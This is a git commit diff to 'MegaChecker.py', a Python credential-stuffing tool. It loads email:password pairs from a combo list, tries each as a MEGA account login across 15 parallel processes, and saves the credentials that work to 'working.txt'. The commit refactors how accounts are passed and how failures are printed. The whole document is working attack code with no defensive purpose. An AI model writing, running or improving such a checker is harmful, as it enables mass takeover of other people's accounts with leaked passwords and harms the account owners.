b3f0a93b8a41b53354bf27494a50a016e9ac2efe
Miyako Yakota <50219605+MiyakoYakota@users.noreply.github.com>
2020-10-07 14:47:29 -0400

    Update MegaChecker.py

--- MegaChecker.py
+++ MegaChecker.py
@@ -2,34 +2,26 @@ from mega import Mega
 import requests # For making web requests
 from multiprocessing import Pool # Multi-Threading
 from multiprocessing import freeze_support # Windows Support
-
-working = []
 accounts = [line.rstrip('\n') for line in open("combo.txt", 'r')]
 mega = Mega()
 
-def checkAccount(accountNumber):
-    global working, mega
+def checkAccount(account):
+    global mega
     try:
-        m = mega.login(accounts[accountNumber].split(':')[0], accounts[accountNumber].split(':')[1])
-        
-        print("[Good Account] " + accounts[accountNumber])
-        
-        working.append(accounts[accountNumber])
+        m = mega.login(account.split(':')[0], account.split(':')[1])
+        print("[Good Account] " + account)
         workingfile = open("working.txt", "a")
-        workingfile.write(accounts[accountNumber] + "\n")
+        workingfile.write(account + "\n")
         workingfile.close()
     except Exception as e:
-        #print("[Bad Account] " + accounts[accountNumber] + " " + str(e))
-        print("[Bad Account] " + accounts[accountNumber])
-
+        print(f"[Bad Account] {account} {str(e)}")
 
 def main():
     numThreads = 15
     freeze_support()
-    numAccounts = range(len(accounts))
 
     pool = Pool(int(numThreads))
-    pool.map(checkAccount, numAccounts)
+    pool.map(checkAccount, accounts)
 
     pool.close()
     pool.join()
